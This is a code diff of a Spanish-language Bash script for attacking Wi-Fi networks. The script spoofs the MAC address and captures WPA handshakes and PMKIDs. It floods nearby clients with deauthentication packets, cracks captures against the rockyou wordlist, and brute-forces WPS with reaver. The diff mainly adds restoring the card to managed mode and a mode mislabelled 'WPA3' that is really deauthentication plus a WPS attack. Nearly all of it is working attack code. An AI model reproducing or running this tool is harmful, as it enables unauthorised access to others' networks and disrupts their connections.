@@ -29,9 +29,12 @@ export DEBIAN_FRONTEND=noninteractive
 trap ctrl_c INT
 
 function ctrl_c() {
-    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Saliendo${endColour}"
+    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Saliendo y restaurando la configuración original...${endColour}"
     tput cnorm
     airmon-ng stop ${networkCard}mon > /dev/null 2>&1
+    ifconfig ${networkCard} down
+    iwconfig ${networkCard} mode managed
+    ifconfig ${networkCard} up
     rm Captura* 2>/dev/null
     exit 0
 }
@@ -69,9 +72,8 @@ function dependencies() {
     done
 }
 
-function startAttack() {
-    clear
-    echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando tarjeta de red...${endColour}\n"
+function startMonitorMode() {
+    echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando tarjeta de red en modo monitor...${endColour}"
     ifconfig $networkCard down
     iwconfig $networkCard mode monitor
     ifconfig $networkCard up
@@ -79,7 +81,6 @@ function startAttack() {
         echo -e "${redColour}[!] Error al configurar $networkCard en modo monitor${endColour}"
         exit 1
     fi
-
     ifconfig ${networkCard}mon down
     macchanger -a ${networkCard}mon > /dev/null 2>&1
     ifconfig ${networkCard}mon up
@@ -87,6 +88,23 @@ function startAttack() {
 
     new_mac=$(macchanger -s ${networkCard}mon | grep -i current | xargs | cut -d ' ' -f '3-100')
     echo -e "${yellowColour}[*]${endColour}${grayColour} Nueva dirección MAC asignada ${endColour}${purpleColour}[${endColour}${blueColour}$new_mac${endColour}${purpleColour}]${endColour}"
+}
+
+function restoreManagedMode() {
+    echo -e "${yellowColour}[*]${endColour}${grayColour} Restaurando tarjeta de red a modo gestionado...${endColour}"
+    ifconfig ${networkCard} down
+    iwconfig ${networkCard} mode managed
+    ifconfig ${networkCard} up
+    if [ $? -ne 0 ]; then
+        echo -e "${redColour}[!] Error al restaurar $networkCard a modo gestionado${endColour}"
+        exit 1
+    fi
+}
+
+function startAttack() {
+    if [ "$attack_mode" == "Handshake" ] || [ "$attack_mode" == "PKMID" ] || [ "$attack_mode" == "WPA3" ]; then
+        startMonitorMode
+    fi
 
     if [ "$attack_mode" == "Handshake" ]; then
         echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando ataque Handshake.${endColour}"
@@ -115,7 +133,7 @@ function startAttack() {
         xterm -hold -e "aircrack-ng -w /usr/share/wordlists/rockyou.txt Captura-01.cap" &
     elif [ "$attack_mode" == "PKMID" ]; then
         echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando ataque PKMID.${endColour}"
-        timeout 60 bash -c "hcxdumptool -i ${networkCard}mon --enable_status=1 -o Captura"
+        timeout 180 bash -c "hcxdumptool -i ${networkCard}mon --enable_status=1 -o Captura & while :; do sleep 1; echo -n '.'; done"
         echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Obteniendo Hashes...${endColour}\n"
         hcxpcaptool -z myHashes Captura
         rm Captura 2>/dev/null
@@ -130,33 +148,49 @@ function startAttack() {
         fi
     elif [ "$attack_mode" == "WPA3" ]; then
         echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando ataque WPA3.${endColour}"
-        reaver -i ${networkCard}mon -b $bssid -K 1 -vv
-    else
-        echo -e "\n${redColour}[*] Este modo de ataque no es válido${endColour}\n"
+        echo -ne "\n${yellowColour}[*]${endColour}${grayColour} BSSID del punto de acceso: ${endColour}" && read bssid
+        echo -ne "\n${yellowColour}[*]${endColour}${grayColour} ESSID del punto de acceso: ${endColour}" && read essid
+        echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Canal del punto de acceso: ${endColour}" && read apChannel
+        xterm -hold -e "airodump-ng -c $apChannel --bssid $bssid -w Captura ${networkCard}mon" &
+        airodump_filter_xterm_PID=$!
+
+        sleep 5
+        xterm -hold -e "aireplay-ng -0 10 -e $essid -c FF:FF:FF:FF:FF:FF ${networkCard}mon" &
+        aireplay_xterm_PID=$!
+        sleep 10
+        kill -9 $aireplay_xterm_PID 2>/dev/null
+        wait $aireplay_xterm_PID 2>/dev/null
+
+        sleep 10
+        kill -9 $airodump_filter_xterm_PID 2>/dev/null
+        wait $airodump_filter_xterm_PID 2>/dev/null
+
+        reaver -i ${networkCard}mon -b $bssid -c $apChannel -vv -K 1 -S
+    fi
+
+    if [ "$attack_mode" == "Handshake" ] || [ "$attack_mode" == "PKMID" ] || [ "$attack_mode" == "WPA3" ]; then
+        restoreManagedMode
     fi
 }
 
-# Main Function
-
+# Main
 if [ "$(id -u)" == "0" ]; then
     asciiArt
-    declare -i parameter_counter=0
-    while getopts ":a:n:h:" arg; do
+    dependencies
+    while getopts "a:n:h" arg; do
         case $arg in
-            a) attack_mode=$OPTARG; let parameter_counter+=1 ;;
-            n) networkCard=$OPTARG; let parameter_counter+=1 ;;
+            a) attack_mode=$OPTARG ;;
+            n) networkCard=$OPTARG ;;
             h) helpPanel ;;
         esac
     done
 
-    if [ $parameter_counter -ne 2 ]; then
-        helpPanel
-    else
-        dependencies
+    if [ "$attack_mode" ] && [ "$networkCard" ]; then
         startAttack
-        tput cnorm
+    else
+        helpPanel
     fi
 else
-    echo -e "\n${redColour}[!] Debes ser root para ejecutar este script${endColour}\n"
+    echo -e "${redColour}[!] Necesitas ser root para ejecutar este script${endColour}"
     exit 1
 fi
